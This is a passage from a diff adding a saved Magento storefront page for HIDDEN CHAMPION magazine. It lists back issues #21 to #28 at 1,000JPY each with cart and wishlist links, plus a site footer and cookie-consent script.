+                                                                    <li><a href="http://store.hidden-champion.net/index.php/wishlist/index/add/product/119/form_key/8oquL69D1RWNAxsQ/" class="link-wishlist">Add to Wishlist</a></li>
+                                                                                                    <li><span class="separator">|</span> <a href="http://store.hidden-champion.net/index.php/catalog/product_compare/add/product/119/uenc/aHR0cDovL3N0b3JlLmhpZGRlbi1jaGFtcGlvbi5uZXQv/form_key/8oquL69D1RWNAxsQ/" class="link-compare">Add to Compare</a></li>
+                                                            </ul>
+                        </div>
+                    </div>
+                </li>
+                            <li class="item last">
+                                        <a href="http://store.hidden-champion.net/index.php/1000001-155.html" title="HIDDEN CHAMPION ISSUE#28" class="product-image">
+                        <img src="http://store.hidden-champion.net/media/catalog/product/cache/1/small_image/420x/9df78eab33525d08d6e5fb8d27136e95/h/i/hidden28_cover_1200_2.jpg" alt="HIDDEN CHAMPION ISSUE#28" />
+                    </a>
+                    <div class="product-info">
+                        <h3 class="product-name"><a href="http://store.hidden-champion.net/index.php/1000001-155.html" title="HIDDEN CHAMPION ISSUE#28)">HIDDEN CHAMPION ISSUE#28</a></h3>
+                        
+
+                        
+    <div class="price-box">
+                                                                <span class="regular-price" id="product-price-120-widget-new-grid">
+                                            <span class="price">1,000JPY</span>                                    </span>
+                        
+        </div>
+
+                                                <div class="actions">
+                                                            <button type="button" title="Add to Cart" class="button btn-cart" onclick="setLocation('http://store.hidden-champion.net/index.php/checkout/cart/add/uenc/aHR0cDovL3N0b3JlLmhpZGRlbi1jaGFtcGlvbi5uZXQv/product/120/form_key/8oquL69D1RWNAxsQ/')"><span><span>Add to Cart</span></span></button>
+                                                        <ul class="add-to-links">
+                                                                    <li><a href="http://store.hidden-champion.net/index.php/wishlist/index/add/product/120/form_key/8oquL69D1RWNAxsQ/" class="link-wishlist">Add to Wishlist</a></li>
+                                                                                                    <li><span class="separator">|</span> <a href="http://store.hidden-champion.net/index.php/catalog/product_compare/add/product/120/uenc/aHR0cDovL3N0b3JlLmhpZGRlbi1jaGFtcGlvbi5uZXQv/form_key/8oquL69D1RWNAxsQ/" class="link-compare">Add to Compare</a></li>
+                                                            </ul>
+                        </div>
+                    </div>
+                </li>
+                            <li class="item last">
+                                        <a href="http://store.hidden-champion.net/index.php/1000001-156.html" title="HIDDEN CHAMPION ISSUE#27" class="product-image">
+                        <img src="http://store.hidden-champion.net/media/catalog/product/cache/1/small_image/420x/9df78eab33525d08d6e5fb8d27136e95/h/i/hidden27_cover_1200_2.jpg" alt="HIDDEN CHAMPION ISSUE#27" />
+                    </a>
+                    <div class="product-info">
+                        <h3 class="product-name"><a href="http://store.hidden-champion.net/index.php/1000001-156.html" title="HIDDEN CHAMPION ISSUE#27)">HIDDEN CHAMPION ISSUE#27</a></h3>
+                        
+
+                        
+    <div class="price-box">
+                                                                <span class="regular-price" id="product-price-121-widget-new-grid">
+                                            <span class="price">1,000JPY</span>                                    </span>
+                        
+        </div>
+
+                                                <div class="actions">
+                                                            <button type="button" title="Add to Cart" class="button btn-cart" onclick="setLocation('http://store.hidden-champion.net/index.php/checkout/cart/add/uenc/aHR0cDovL3N0b3JlLmhpZGRlbi1jaGFtcGlvbi5uZXQv/product/121/form_key/8oquL69D1RWNAxsQ/')"><span><span>Add to Cart</span></span></button>
+                                                        <ul class="add-to-links">
+                                                                    <li><a href="http://store.hidden-champion.net/index.php/wishlist/index/add/product/121/form_key/8oquL69D1RWNAxsQ/" class="link-wishlist">Add to Wishlist</a></li>
+                                                                                                    <li><span class="separator">|</span> <a href="http://store.hidden-champion.net/index.php/catalog/product_compare/add/product/121/uenc/aHR0cDovL3N0b3JlLmhpZGRlbi1jaGFtcGlvbi5uZXQv/form_key/8oquL69D1RWNAxsQ/" class="link-compare">Add to Compare</a></li>
+                                                            </ul>
+                        </div>
+                    </div>
+                </li>
+                            <li class="item last">
+                                        <a href="http://store.hidden-champion.net/index.php/1000001-157.html" title="HIDDEN CHAMPION ISSUE#26" class="product-image">
+                        <img src="http://store.hidden-champion.net/media/catalog/product/cache/1/small_image/420x/9df78eab33525d08d6e5fb8d27136e95/h/i/hidden26_cover_1200_1.jpg" alt="HIDDEN CHAMPION ISSUE#26" />
+                    </a>
+                    <div class="product-info">
+                        <h3 class="product-name"><a href="http://store.hidden-champion.net/index.php/1000001-157.html" title="HIDDEN CHAMPION ISSUE#26)">HIDDEN CHAMPION ISSUE#26</a></h3>
+                        
+
+                        
+    <div class="price-box">
+                                                                <span class="regular-price" id="product-price-122-widget-new-grid">
+                                            <span class="price">1,000JPY</span>                                    </span>
+                        
+        </div>
+
+                                                <div class="actions">
+                                                            <button type="button" title="Add to Cart" class="button btn-cart" onclick="setLocation('http://store.hidden-champion.net/index.php/checkout/cart/add/uenc/aHR0cDovL3N0b3JlLmhpZGRlbi1jaGFtcGlvbi5uZXQv/product/122/form_key/8oquL69D1RWNAxsQ/')"><span><span>Add to Cart</span></span></button>
+                                                        <ul class="add-to-links">
+                                                                    <li><a href="http://store.hidden-champion.net/index.php/wishlist/index/add/product/122/form_key/8oquL69D1RWNAxsQ/" class="link-wishlist">Add to Wishlist</a></li>
+                                                                                                    <li><span class="separator">|</span> <a href="http://store.hidden-champion.net/index.php/catalog/product_compare/add/product/122/uenc/aHR0cDovL3N0b3JlLmhpZGRlbi1jaGFtcGlvbi5uZXQv/form_key/8oquL69D1RWNAxsQ/" class="link-compare">Add to Compare</a></li>
+                                                            </ul>
+                        </div>
+                    </div>
+                </li>
+                            <li class="item last">
+                                        <a href="http://store.hidden-champion.net/index.php/1000001-158.html" title="HIDDEN CHAMPION ISSUE#25" class="product-image">
+                        <img src="http://store.hidden-champion.net/media/catalog/product/cache/1/small_image/420x/9df78eab33525d08d6e5fb8d27136e95/h/i/hidden25_cover_1200_1.jpg" alt="HIDDEN CHAMPION ISSUE#25" />
+                    </a>
+                    <div class="product-info">
+                        <h3 class="product-name"><a href="http://store.hidden-champion.net/index.php/1000001-158.html" title="HIDDEN CHAMPION ISSUE#25)">HIDDEN CHAMPION ISSUE#25</a></h3>
+                        
+
+                        
+    <div class="price-box">
+                                                                <span class="regular-price" id="product-price-123-widget-new-grid">
+                                            <span class="price">1,000JPY</span>                                    </span>
+                        
+        </div>
+
+                                                <div class="actions">
+                                                            <button type="button" title="Add to Cart" class="button btn-cart" onclick="setLocation('http://store.hidden-champion.net/index.php/checkout/cart/add/uenc/aHR0cDovL3N0b3JlLmhpZGRlbi1jaGFtcGlvbi5uZXQv/product/123/form_key/8oquL69D1RWNAxsQ/')"><span><span>Add to Cart</span></span></button>
+                                                        <ul class="add-to-links">
+                                                                    <li><a href="http://store.hidden-champion.net/index.php/wishlist/index/add/product/123/form_key/8oquL69D1RWNAxsQ/" class="link-wishlist">Add to Wishlist</a></li>
+                                                                                                    <li><span class="separator">|</span> <a href="http://store.hidden-champion.net/index.php/catalog/product_compare/add/product/123/uenc/aHR0cDovL3N0b3JlLmhpZGRlbi1jaGFtcGlvbi5uZXQv/form_key/8oquL69D1RWNAxsQ/" class="link-compare">Add to Compare</a></li>
+                                                            </ul>
+                        </div>
+                    </div>
+                </li>
+                            <li class="item last">
+                                        <a href="http://store.hidden-champion.net/index.php/1000001-159.html" title="HIDDEN CHAMPION ISSUE#24" class="product-image">
+                        <img src="http://store.hidden-champion.net/media/catalog/product/cache/1/small_image/420x/9df78eab33525d08d6e5fb8d27136e95/h/i/hidden24_cover_1200_1.jpg" alt="HIDDEN CHAMPION ISSUE#24" />
+                    </a>
+                    <div class="product-info">
+                        <h3 class="product-name"><a href="http://store.hidden-champion.net/index.php/1000001-159.html" title="HIDDEN CHAMPION ISSUE#24)">HIDDEN CHAMPION ISSUE#24</a></h3>
+                        
+
+                        
+    <div class="price-box">
+                                                                <span class="regular-price" id="product-price-124-widget-new-grid">
+                                            <span class="price">1,000JPY</span>                                    </span>
+                        
+        </div>
+
+                                                <div class="actions">
+                                                            <button type="button" title="Add to Cart" class="button btn-cart" onclick="setLocation('http://store.hidden-champion.net/index.php/checkout/cart/add/uenc/aHR0cDovL3N0b3JlLmhpZGRlbi1jaGFtcGlvbi5uZXQv/product/124/form_key/8oquL69D1RWNAxsQ/')"><span><span>Add to Cart</span></span></button>
+                                                        <ul class="add-to-links">
+                                                                    <li><a href="http://store.hidden-champion.net/index.php/wishlist/index/add/product/124/form_key/8oquL69D1RWNAxsQ/" class="link-wishlist">Add to Wishlist</a></li>
+                                                                                                    <li><span class="separator">|</span> <a href="http://store.hidden-champion.net/index.php/catalog/product_compare/add/product/124/uenc/aHR0cDovL3N0b3JlLmhpZGRlbi1jaGFtcGlvbi5uZXQv/form_key/8oquL69D1RWNAxsQ/" class="link-compare">Add to Compare</a></li>
+                                                            </ul>
+                        </div>
+                    </div>
+                </li>
+                            <li class="item last">
+                                        <a href="http://store.hidden-champion.net/index.php/1000001-160.html" title="HIDDEN CHAMPION ISSUE#23" class="product-image">
+                        <img src="http://store.hidden-champion.net/media/catalog/product/cache/1/small_image/420x/9df78eab33525d08d6e5fb8d27136e95/h/i/hidden23_cover_1200_1.jpg" alt="HIDDEN CHAMPION ISSUE#23" />
+                    </a>
+                    <div class="product-info">
+                        <h3 class="product-name"><a href="http://store.hidden-champion.net/index.php/1000001-160.html" title="HIDDEN CHAMPION ISSUE#23)">HIDDEN CHAMPION ISSUE#23</a></h3>
+                        
+
+                        
+    <div class="price-box">
+                                                                <span class="regular-price" id="product-price-125-widget-new-grid">
+                                            <span class="price">1,000JPY</span>                                    </span>
+                        
+        </div>
+
+                                                <div class="actions">
+                                                            <button type="button" title="Add to Cart" class="button btn-cart" onclick="setLocation('http://store.hidden-champion.net/index.php/checkout/cart/add/uenc/aHR0cDovL3N0b3JlLmhpZGRlbi1jaGFtcGlvbi5uZXQv/product/125/form_key/8oquL69D1RWNAxsQ/')"><span><span>Add to Cart</span></span></button>
+                                                        <ul class="add-to-links">
+                                                                    <li><a href="http://store.hidden-champion.net/index.php/wishlist/index/add/product/125/form_key/8oquL69D1RWNAxsQ/" class="link-wishlist">Add to Wishlist</a></li>
+                                                                                                    <li><span class="separator">|</span> <a href="http://store.hidden-champion.net/index.php/catalog/product_compare/add/product/125/uenc/aHR0cDovL3N0b3JlLmhpZGRlbi1jaGFtcGlvbi5uZXQv/form_key/8oquL69D1RWNAxsQ/" class="link-compare">Add to Compare</a></li>
+                                                            </ul>
+                        </div>
+                    </div>
+                </li>
+                            <li class="item last">
+                                        <a href="http://store.hidden-champion.net/index.php/1000001-161.html" title="HIDDEN CHAMPION ISSUE#22" class="product-image">
+                        <img src="http://store.hidden-champion.net/media/catalog/product/cache/1/small_image/420x/9df78eab33525d08d6e5fb8d27136e95/h/i/hidden22_cover_1200_1.jpg" alt="HIDDEN CHAMPION ISSUE#22" />
+                    </a>
+                    <div class="product-info">
+                        <h3 class="product-name"><a href="http://store.hidden-champion.net/index.php/1000001-161.html" title="HIDDEN CHAMPION ISSUE#22)">HIDDEN CHAMPION ISSUE#22</a></h3>
+                        
+
+                        
+    <div class="price-box">
+                                                                <span class="regular-price" id="product-price-126-widget-new-grid">
+                                            <span class="price">1,000JPY</span>                                    </span>
+                        
+        </div>
+
+                                                <div class="actions">
+                                                            <button type="button" title="Add to Cart" class="button btn-cart" onclick="setLocation('http://store.hidden-champion.net/index.php/checkout/cart/add/uenc/aHR0cDovL3N0b3JlLmhpZGRlbi1jaGFtcGlvbi5uZXQv/product/126/form_key/8oquL69D1RWNAxsQ/')"><span><span>Add to Cart</span></span></button>
+                                                        <ul class="add-to-links">
+                                                                    <li><a href="http://store.hidden-champion.net/index.php/wishlist/index/add/product/126/form_key/8oquL69D1RWNAxsQ/" class="link-wishlist">Add to Wishlist</a></li>
+                                                                                                    <li><span class="separator">|</span> <a href="http://store.hidden-champion.net/index.php/catalog/product_compare/add/product/126/uenc/aHR0cDovL3N0b3JlLmhpZGRlbi1jaGFtcGlvbi5uZXQv/form_key/8oquL69D1RWNAxsQ/" class="link-compare">Add to Compare</a></li>
+                                                            </ul>
+                        </div>
+                    </div>
+                </li>
+                            <li class="item last">
+                                        <a href="http://store.hidden-champion.net/index.php/1000001-162.html" title="HIDDEN CHAMPION ISSUE#21" class="product-image">
+                        <img src="http://store.hidden-champion.net/media/catalog/product/cache/1/small_image/420x/9df78eab33525d08d6e5fb8d27136e95/h/i/hidden21_cover_1200_1.jpg" alt="HIDDEN CHAMPION ISSUE#21" />
+                    </a>
+                    <div class="product-info">
+                        <h3 class="product-name"><a href="http://store.hidden-champion.net/index.php/1000001-162.html" title="HIDDEN CHAMPION ISSUE#21)">HIDDEN CHAMPION ISSUE#21</a></h3>
+                        
+
+                        
+    <div class="price-box">
+                                                                <span class="regular-price" id="product-price-127-widget-new-grid">
+                                            <span class="price">1,000JPY</span>                                    </span>
+                        
+        </div>
+
+                                                <div class="actions">
+                                                            <button type="button" title="Add to Cart" class="button btn-cart" onclick="setLocation('http://store.hidden-champion.net/index.php/checkout/cart/add/uenc/aHR0cDovL3N0b3JlLmhpZGRlbi1jaGFtcGlvbi5uZXQv/product/127/form_key/8oquL69D1RWNAxsQ/')"><span><span>Add to Cart</span></span></button>
+                                                        <ul class="add-to-links">
+                                                                    <li><a href="http://store.hidden-champion.net/index.php/wishlist/index/add/product/127/form_key/8oquL69D1RWNAxsQ/" class="link-wishlist">Add to Wishlist</a></li>
+                                                                                                    <li><span class="separator">|</span> <a href="http://store.hidden-champion.net/index.php/catalog/product_compare/add/product/127/uenc/aHR0cDovL3N0b3JlLmhpZGRlbi1jaGFtcGlvbi5uZXQv/form_key/8oquL69D1RWNAxsQ/" class="link-compare">Add to Compare</a></li>
+                                                            </ul>
+                        </div>
+                    </div>
+                </li>
+                    </ul>
+    </div>
+</div>
+</p></div>                </div>
+            </div>
+        </div>
+                <div class="footer-container">
+    <div class="footer">
+        
+<div class="links">
+    <div class="block-title">
+        <strong><span>Company</span></strong>
+    </div>
+    <ul>
+        <li><a href="http://store.hidden-champion.net/index.php/about-magento-demo-store/">About Us</a></li>
+        <li><a href="http://store.hidden-champion.net/index.php/contacts/">Contact Us</a></li>
+        <li><a href="http://store.hidden-champion.net/index.php/customer-service/">Customer Service</a></li>
+        <li><a href="http://store.hidden-champion.net/index.php/privacy-policy-cookie-restriction-mode/">Privacy Policy</a></li>
+    </ul>
+</div>        <address class="copyright">© 2015 HIDDEN CHAMPION. All Rights Reserved.</address>
+    </div>
+</div>
+                <div class="global-site-notice notice-cookie" id="notice-cookie-block">
+    <div class="notice-inner">
+        <div class="notice-text"><p>This website requires cookies to provide all of its features. For more information on what data is contained in the cookies, please see our <a href="http://store.hidden-champion.net/index.php/privacy-policy-cookie-restriction-mode">Privacy Policy page</a>. To accept cookies from this site, please click the Allow button below.</p></div>
+        <div class="actions"><button class="button" onclick="allowSaveCookie()"><span><span>Allow</span></span></button></div>
+    </div>
+</div>
+<script type="text/javascript">
+    /* <![CDATA[ */
+    function allowSaveCookie() {
+        Mage.Cookies.set('user_allowed_save_cookie', '{"1":1}', new Date(new Date().getTime() + 31536000 * 1000));
+        if (Mage.Cookies.get('user_allowed_save_cookie')) {
+            window.location.reload();
+        } else {
+            window.location.href = 'http://store.hidden-champion.net/index.php/cms/index/noCookies/';
+        }
+    }
+    $('notice-cookie-block').show();
+    /* ]]> */
+</script>
+
+
+    </div>
+</div>
+</body>
+</html>
+
